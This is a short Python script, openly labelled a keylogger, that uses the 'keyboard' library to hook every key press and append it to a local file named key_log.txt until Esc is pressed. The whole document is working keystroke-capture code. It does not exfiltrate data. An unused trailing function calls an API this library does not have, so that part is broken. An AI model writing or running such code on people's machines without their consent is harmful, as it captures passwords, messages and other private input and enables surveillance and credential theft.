import keyboard

LOG_FILE = "key_log.txt"

def log_keystroke(event):
        with open(LOG_FILE, "a") as log:
            key = event.name
            if len(key) > 1:
                log.write(f"{str(key)} ")
            else:
                log.write(key)

def main():
    print("starting the keylogger.... (press 'esc' to stop)")
    keyboard.on_press(log_keystroke)
    keyboard.wait("esc")

def on_press(key):
    if key == keyboard.key.esc:
        return False
    print("keylogger stopped and file saved")

if __name__ == "__main__":
    main()
